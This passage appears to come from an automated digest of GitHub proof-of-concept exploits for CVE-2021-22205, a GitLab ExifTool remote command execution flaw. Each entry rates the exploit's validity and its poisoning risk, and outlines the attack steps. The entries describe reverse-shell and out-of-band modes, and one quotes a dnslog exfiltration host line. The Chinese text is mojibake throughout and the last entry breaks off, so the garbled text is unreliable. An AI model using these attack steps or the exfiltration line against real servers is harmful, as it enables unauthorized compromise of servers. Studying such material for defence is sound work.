**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
